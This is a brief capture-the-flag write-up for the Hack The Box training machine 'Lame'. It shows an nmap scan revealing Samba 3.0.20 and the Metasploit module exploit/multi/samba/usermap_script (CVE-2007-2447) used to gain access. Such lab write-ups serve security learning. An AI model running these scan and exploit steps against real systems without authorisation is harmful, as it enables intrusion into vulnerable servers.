# Lame Write-Up

Easy

Tags: 
`CVE-2007-2447`

## Intro

1. Use exploit/multi/samba/usermap_script

## Exploit

### Port scanning

```
nmap -T4 -A -p 139,445 10.10.10.3 -Pn
```
```
PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)

Host script results:
|_clock-skew: mean: 2h07m57s, deviation: 2h49m43s, median: 7m56s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2022-05-01T05:37:54-04:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
```

### Search samba 3.0.20 on msf

```
use exploit/multi/samba/usermap_script
```

Set rhosts > run